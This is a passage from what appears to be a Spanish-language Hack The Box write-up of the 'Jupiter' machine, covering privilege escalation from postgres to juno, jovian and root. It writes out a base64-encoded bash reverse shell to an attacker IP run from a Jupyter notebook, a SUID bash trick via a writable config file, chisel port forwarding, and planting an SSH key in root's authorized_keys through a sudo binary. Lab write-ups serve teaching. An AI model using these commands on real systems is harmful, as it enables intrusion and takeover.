</span></span><span class=line><span class=cl>2023/11/01 18:52:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>1000</span>  <span class=nv>PID</span><span class=o>=</span><span class=m>21199</span>  <span class=p>|</span> /usr/bin/curl -s server
</span></span></code></pre></div><p>No tenemos acceso a /home/juno por lo que no podemos ver el script <code>shadow-simulation.sh</code>, pero sí tenemos acceso a /dev/shm. Si hacemos un cat al <code>/dev/shm/network-simulation.yml</code> podemos ver lo siguiente:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>general</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=c># stop after 10 simulated seconds</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>stop_time</span><span class=p>:</span><span class=w> </span><span class=l>10s</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=c># old versions of cURL use a busy loop, so to avoid spinning in this busy</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=c># loop indefinitely, we add a system call latency to advance the simulated</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=c># time when running non-blocking system calls</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>model_unblocked_syscall_latency</span><span class=p>:</span><span class=w> </span><span class=kc>true</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>network</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>graph</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c># use a built-in network graph containing</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c># a single vertex with a bandwidth of 1 Gbit</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>type</span><span class=p>:</span><span class=w> </span><span class=l>1_gbit_switch</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>hosts</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=c># a host with the hostname &#39;server&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>server</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>network_node_id</span><span class=p>:</span><span class=w> </span><span class=m>0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>processes</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>- <span class=nt>path</span><span class=p>:</span><span class=w> </span><span class=l>/usr/bin/python3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>args</span><span class=p>:</span><span class=w> </span>-<span class=l>m http.server 80</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>start_time</span><span class=p>:</span><span class=w> </span><span class=l>3s</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=c># three hosts with hostnames &#39;client1&#39;, &#39;client2&#39;, and &#39;client3&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>client</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>network_node_id</span><span class=p>:</span><span class=w> </span><span class=m>0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>quantity</span><span class=p>:</span><span class=w> </span><span class=m>3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>processes</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>- <span class=nt>path</span><span class=p>:</span><span class=w> </span><span class=l>/usr/bin/curl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>args</span><span class=p>:</span><span class=w> </span>-<span class=l>s server</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>start_time</span><span class=p>:</span><span class=w> </span><span class=l>5s</span><span class=w>
</span></span></span></code></pre></div><p>Si nos fijamos, hay dos comandos que se están ejecutando <code>python3 -m http.server 80</code> y <code>curl -s server</code> los cuales en el pspy salía que se ejecutaban después del <code>/home/juno/.local/bin/shadow /dev/shm/network-simulation.yml</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>2023/11/01 18:52:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>1000</span>  <span class=nv>PID</span><span class=o>=</span><span class=m>21198</span>  <span class=p>|</span> /usr/bin/python3 -m http.server <span class=m>80</span> 
</span></span><span class=line><span class=cl>2023/11/01 18:52:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>1000</span>  <span class=nv>PID</span><span class=o>=</span><span class=m>21199</span>  <span class=p>|</span> /usr/bin/curl -s server
</span></span></code></pre></div><p>Con un ls -l vemos que tenemos permisos de escritura y lectura en el /dev/shm/network-simulation.yml</p><pre tabindex=0><code>$ls -l /dev/shm/network-simulation.yml

-rw-rw-rw- 1 juno juno 815 Mar  7  2023 /dev/shm/network-simulation.yml
</code></pre><p>Así que vamos a modificarlo&mldr;</p><p>Vamos a hacer que haga una copia de <code>/bin/bash</code> en <code>/tmp/bash</code> y le dé permisos suid</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>hosts</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=c># a host with the hostname &#39;server&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>server</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>network_node_id</span><span class=p>:</span><span class=w> </span><span class=m>0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>processes</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>- <span class=nt>path</span><span class=p>:</span><span class=w> </span><span class=l>/usr/bin/cp</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>args</span><span class=p>:</span><span class=w> </span><span class=l>/bin/bash /tmp/bash</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>start_time</span><span class=p>:</span><span class=w> </span><span class=l>3s</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=c># three hosts with hostnames &#39;client1&#39;, &#39;client2&#39;, and &#39;client3&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>client</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>network_node_id</span><span class=p>:</span><span class=w> </span><span class=m>0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>quantity</span><span class=p>:</span><span class=w> </span><span class=m>3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>processes</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>- <span class=nt>path</span><span class=p>:</span><span class=w> </span><span class=l>/usr/bin/chmod</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>args</span><span class=p>:</span><span class=w> </span><span class=l>u+s /tmp/bash</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>start_time</span><span class=p>:</span><span class=w> </span><span class=l>5s</span><span class=w>
</span></span></span></code></pre></div><p>Ahora solo falta esperar a que se ejecute y ejecutar /tmp/bash -p para ejecutar la bash con privilegios</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>postgres@jupiter:/tmp$ /tmp/bash -p
</span></span><span class=line><span class=cl>bash-5.1$ whoami
</span></span><span class=line><span class=cl>juno
</span></span></code></pre></div><h3 id=jovian>jovian<a href=#jovian class=anchor aria-hidden=true>#</a></h3><p>Pasa una cosa rara y es que somos juno, pero algunos comandos se ejecutan como postgres como en este caso <code>ìd</code></p><pre tabindex=0><code>bash-5.1$ whoami
juno
bash-5.1$ id
uid=114(postgres) gid=120(postgres) euid=1000(juno) groups=120(postgres),119(ssl-cert) 
</code></pre><p>Para solucionar esto vamos a conectarnos por ssh, primero en la máquina atacante vamos a crear las llaves ssh con <code>ssh-keygen</code>. Esto nos creará una carpeta en nuestro directorio llamada .ssh, dentro habrá un archivo llamado id_rsa.pub que será nuestra llave pública, esta llave vamos a tener que ponerla en <code>/home/juno/authorized_keys</code>. Ahora ya nos podemos conectar por ssh sin necesidad de especificar contraseñas</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh juno@10.10.11.216
</span></span></code></pre></div><p>Ahora que ya tenemos una consola en condiciones, vamos a hacer un <code>id</code> para ver en que grupos estamos</p><pre tabindex=0><code>uid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science)
</code></pre><p>Hay un grupo que llama la atención, <strong>science</strong>. Podemos buscar que archivos pertenecen a este grupo con el siguiente comando</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>find / -group science 2&gt;/dev/null
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/opt/solar-flares
</span></span><span class=line><span class=cl>/opt/solar-flares/flares.csv
</span></span><span class=line><span class=cl>/opt/solar-flares/xflares.csv
</span></span><span class=line><span class=cl>/opt/solar-flares/map.jpg
</span></span><span class=line><span class=cl>/opt/solar-flares/start.sh
</span></span><span class=line><span class=cl>/opt/solar-flares/logs
</span></span><span class=line><span class=cl>/opt/solar-flares/logs/jupyter-2023-03-10-25.log
</span></span><span class=line><span class=cl>/opt/solar-flares/logs/jupyter-2023-03-08-37.log
</span></span><span class=line><span class=cl>/opt/solar-flares/logs/jupyter-2023-03-08-38.log
</span></span><span class=line><span class=cl>/opt/solar-flares/logs/jupyter-2023-03-08-36.log
</span></span><span class=line><span class=cl>/opt/solar-flares/logs/jupyter-2023-03-09-11.log
</span></span><span class=line><span class=cl>/opt/solar-flares/logs/jupyter-2023-03-09-24.log
</span></span><span class=line><span class=cl>/opt/solar-flares/logs/jupyter-2023-03-08-14.log
</span></span><span class=line><span class=cl>/opt/solar-flares/logs/jupyter-2023-03-09-59.log
</span></span><span class=line><span class=cl>/opt/solar-flares/flares.html
</span></span><span class=line><span class=cl>/opt/solar-flares/cflares.csv
</span></span><span class=line><span class=cl>/opt/solar-flares/flares.ipynb
</span></span><span class=line><span class=cl>/opt/solar-flares/.ipynb_checkpoints
</span></span><span class=line><span class=cl>/opt/solar-flares/mflares.csv
</span></span></code></pre></div><p>El find reporta que en el /opt hay muchos archivos del grupo science.</p><p>Si vamos al /opt/solar-flares/logs, hay muchos archivos de logs, al hacer un cat al más reciente se ve lo siguiente</p><pre tabindex=0><code>juno@jupiter:/opt/solar-flares/logs$ cat jupyter-2023-11-01-22.log

.....
[I 19:22:56.926 NotebookApp] http://localhost:8888/?token=a36adfafb8a4239c215350cad2e1cc07696168a8e4fa6093
[I 19:22:56.927 NotebookApp]  or http://127.0.0.1:8888/?token=a36adfafb8a4239c215350cad2e1cc07696168a8e4fa6093
.....
</code></pre><p>Vemos que hay una web en la máquina víctima por el puerto 8888, pero ese puerto no lo reporto nmap, eso es porque seguramente este puerto solo se puede ver desde la máquina víctima. Para ver más información de los puertos podemos usar <code>ss -tnlp</code></p><pre tabindex=0><code>juno@jupiter:/opt/solar-flares/logs$ ss -tnlp
State       Recv-Q       Send-Q             Local Address:Port             Peer Address:Port      Process      
LISTEN      0            511                      0.0.0.0:80                    0.0.0.0:*                      
LISTEN      0            4096               127.0.0.53%lo:53                    0.0.0.0:*                      
LISTEN      0            128                      0.0.0.0:22                    0.0.0.0:*                      
LISTEN      0            4096                   127.0.0.1:3000                  0.0.0.0:*                      
LISTEN      0            128                    127.0.0.1:8888                  0.0.0.0:*                      
LISTEN      0            244                    127.0.0.1:5432                  0.0.0.0:*                      
LISTEN      0            128                         [::]:22                       [::]:*                      
</code></pre><p>Si queremos ver este puerto desde nuestra máquina podemos hacer port forwarding, podríamos usar ssh, pero no me apetece así que vamos a usar <a href=https://github.com/jpillora/chisel/releases/tag/v1.9.1>chisel</a>.</p><p>Usarlo es muy sencillo, simplemente nos lo descargamos en nuestra máquina, lo pasamos a la máquina víctima con un servidor con python como hicimos con pspy anteriormente (<code>python3 -m http.server 80</code>), le damos permisos de ejecución (<code>chmod +x chisel</code>) y ejecutamos lo siguiente</p><p>Máquina atacante:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo ./chisel server --reverse -p <span class=m>1234</span>
</span></span></code></pre></div><p>Máquina víctima:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./chisel client 10.10.14.28:443 R:8888:127.0.0.1:8888 <span class=p>&amp;</span>
</span></span></code></pre></div><p>Ahora nuestro puerto 8888 equivale al puerto 8888 de la máquina víctima, con esto completado ya podemos entrar al link que veíamos en los logs</p><pre tabindex=0><code>http://localhost:8888/?token=a36adfafb8a4239c215350cad2e1cc07696168a8e4fa6093
</code></pre><p>Una vez dentro vemos varios archivos los cuales podemos modificar, por lo que podemos intuir que esta web está siendo ejecutada por <strong>root</strong> o por <strong>jovian</strong>. Si vamos a <code>flares.ipynb</code> vemos un archivo que parece tener una documentación de python y arriba hay un botón que pone run y tenemos capacidad para modificar el archivo así que se puede intentar un rce.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span> 
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;whoami&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>jovian</span>
</span></span></code></pre></div><p>Pues tenemos un rce y ya sabemos quién estaba ejecutando esto: jovian</p><p>Para conseguir una reverse shell vamos a usar lo mismo que usamos al principio, así que no lo voy a voler a explicar para no alargar el post</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span> 
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK | base64 -d | bash&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>Ya somos jovian!</p><pre tabindex=0><code>$ nc -nlvp 443
listening on [any] 443 ...

jovian@jupiter:/opt/solar-flares$
</code></pre><h3 id=root>root<a href=#root class=anchor aria-hidden=true>#</a></h3><p>Con un <code>sudo -l</code> vemos que podemos ejecutar como root sin la necesidad de proporcionar contraseña el archivo <code>/usr/local/bin/sattrack</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo -l
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User jovian may run the following commands on jupiter:
</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: /usr/local/bin/sattrack
</span></span></code></pre></div><p>Al ejecutarlo nos sale que no ha encontrado el archivo de configuración</p><pre tabindex=0><code>jovian@jupiter:/opt/solar-flares$ sudo /usr/local/bin/sattrack
sudo /usr/local/bin/sattrack
Satellite Tracking System
Configuration file has not been found. Please try again!
</code></pre><p>Vamos a probar de ver desde donde lo está cargando con el comando strings. El comando strings es básicamente como un cat, pero que solo muestra el contenido legible de archivos como binarios, fotografias, etc..</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>strings /usr/local/bin/sattrack <span class=p>|</span> grep config
</span></span><span class=line><span class=cl>/tmp/config.json
</span></span></code></pre></div><p>Vemos la ruta /tmp/config.json, pero claro, no existe, lo que podemos hacer es buscar en el sistema si existe algún config.json que sea la configuración default para este binario</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ find / -name config.json 2&gt; /dev/null
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/usr/local/share/sattrack/config.json
</span></span></code></pre></div><p>El comando find nos reporta un config.json que está en una carpeta que se llama igual que el binario así que supongo que tendrán algo que ver, vamos a copiar ese archivo al /tmp</p><pre tabindex=0><code>cp /usr/local/share/sattrack/config.json /tmp/config.json
</code></pre><p>Ahora ya podemos ejecutar el binario, pero se queda colgado cargando el recurso de una web.</p><pre tabindex=0><code>$ sudo /usr/local/bin/sattrack

Satellite Tracking System
tleroot does not exist, creating it: /tmp/tle/
Get:0 http://celestrak.org/NORAD/elements/weather.txt
</code></pre><p>Vamos a ver si podemos modificar esto desde el archivo config.json</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;tleroot&#34;</span><span class=p>:</span> <span class=s2>&#34;/tmp/tle/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;tlefile&#34;</span><span class=p>:</span> <span class=s2>&#34;weather.txt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;mapfile&#34;</span><span class=p>:</span> <span class=s2>&#34;/usr/local/share/sattrack/map.json&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;texturefile&#34;</span><span class=p>:</span> <span class=s2>&#34;/usr/local/share/sattrack/earth.png&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=nt>&#34;tlesources&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>		<span class=s2>&#34;http://celestrak.org/NORAD/elements/weather.txt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s2>&#34;http://celestrak.org/NORAD/elements/noaa.txt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s2>&#34;http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&amp;FORMAT=tle&#34;</span>
</span></span><span class=line><span class=cl>	<span class=p>],</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=nt>&#34;updatePerdiod&#34;</span><span class=p>:</span> <span class=mi>1000</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=nt>&#34;station&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;LORCA&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nt>&#34;lat&#34;</span><span class=p>:</span> <span class=mf>37.6725</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nt>&#34;lon&#34;</span><span class=p>:</span> <span class=mf>-1.5863</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nt>&#34;hgt&#34;</span><span class=p>:</span> <span class=mf>335.0</span>
</span></span><span class=line><span class=cl>	<span class=p>},</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=nt>&#34;show&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>	<span class=p>],</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=nt>&#34;columns&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>		<span class=s2>&#34;name&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s2>&#34;azel&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s2>&#34;dis&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s2>&#34;geo&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s2>&#34;tab&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s2>&#34;pos&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s2>&#34;vel&#34;</span>
</span></span><span class=line><span class=cl>	<span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>En tlsources están las webs que estaba cargando el binario, como nosotros tenemos permisos para modificar este script podemos probar de poner nuestra ip y abrirnos un servidor con python (<code>python3 -m http.server 80</code>) para ver si recibimos la petición</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>jovian@jupiter:/opt/solar-flares$ sudo /usr/local/bin/sattrack
</span></span><span class=line><span class=cl>Satellite Tracking System
</span></span><span class=line><span class=cl>Get:0 http://10.10.14.28
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -m http.server <span class=m>80</span>
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>80</span> <span class=o>(</span>http://0.0.0.0:80/<span class=o>)</span> ...
</span></span><span class=line><span class=cl>10.10.11.216 - - <span class=o>[</span>01/Nov/2023 21:25:27<span class=o>]</span> <span class=s2>&#34;GET / HTTP/1.1&#34;</span> <span class=m>200</span> -
</span></span></code></pre></div><p>Efectivamente recibimos la petición. Ahora podríamos probar de poner en vez de nuestra ip poner <code>file:///root/root.txt</code></p><p>Después de ejecutarlo tenemos la flag de root en /tmp/tle/root.txt</p><p>Ya tenemos la flag, pero la gracia es tener una consola como root así que lo que vamos a hacer es generarnos unas llaves de ssh en nuestra máquina</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh-keygen
</span></span></code></pre></div><p>Ahora dentro de nuestro directorio personal tenemos una carpeta .ssh y dentro están las llaves, vamos a copiar la llave pública <code>ìd_rsa.pub</code> y la vamos a poner en un archivo llamado authorized_keys, en ese mismo directorio nos vamos a montar otro servidor con python <code>python3 -m http.server 80</code></p><p>En la máquina víctima vamos a modificar un poco el archivo /tmp/config.json, en la opción tle root podemos poner en que ruta queremos que se descarguen los archivos, ahí vamos a poner la ruta de las llaves de root</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=s2>&#34;tleroot&#34;</span>: <span class=s2>&#34;/root/.ssh/&#34;</span>,
</span></span></code></pre></div><p>Por último en <code>tlesources</code> pondremos nuestra ip y el archivo authorized_keys</p><pre tabindex=0><code>&#34;http://10.10.14.28/authorized_keys&#34;
</code></pre><p>Ahora al ejecutar el programa se pondrá nuestra llave pública dentro de las authorized_keys de root lo que nos va a permitir conectarnos por ssh sin la necesidad de proporcionar contraseña</p><pre tabindex=0><code>ssh root@10.10.11.216

root@jupiter:~#
</code></pre><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="page-nav d-flex flex-column flex-sm-row"><div class="card text-end w-100"><div class="card-body d-flex justify-content-end"><div class="d-flex flex-column"><div class=text-body-secondary>Next</div><a href=/writeups/hackthebox/toolbox/ class="stretched-link text-reset text-decoration-none">Toolbox</a></div><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M13 18l6-6"/><path d="M13 6l6 6"/></svg></div></div></div></div></main></div></div></div><footer class="footer text-muted"><div class=container-lg><div class=row><div class="col-lg-8 text-center text-lg-start"><ul class=list-inline><li class=list-inline-item><a class=text-muted href=/tags/>Tags</a></li></ul></div><div class="col-lg-8 text-center text-lg-end"><ul class=list-inline><li class=list-inline-item>Brought to you by <a class=text-muted href=https://gethyas.com/>Hyas</a></li></ul></div></div></div></footer><script async src=/js/app.1e84dcdaa5ccef6fe83f6d88ac1e444a1f237111cfa2a7a97427f758e9c27ef4.js integrity="sha256-HoTc2qXM72/oP22IrB5ESh8jcRHPoqepdCf3WOnCfvQ="></script><script async src=/js/flexsearch.78e4b7a9456a2770bd6faffb1f6488b30db12ca157c3df4e89e3ae2e258888ae.js integrity="sha256-eOS3qUVqJ3C9b6/7H2SIsw2xLKFXw99OieOuLiWIiK4="></script><script async src=/js/search-modal.c4c023efcdee308e4b5f1110afe1db6b1656f217e67aa7efe54e2f4bf2feccf8.js integrity="sha256-xMAj783uMI5LXxEQr+HbaxZW8hfmeqfv5U4vS/L+zPg="></script><div class="d-inline-flex fixed-bottom-right pb-4 pe-4"><button id=toTop type=button class="btn btn-primary rounded-circle ms-auto p-2"><span class=visually-hidden>Top</span><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-up" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 15l6-6 6 6"/></svg></button></div></body></html>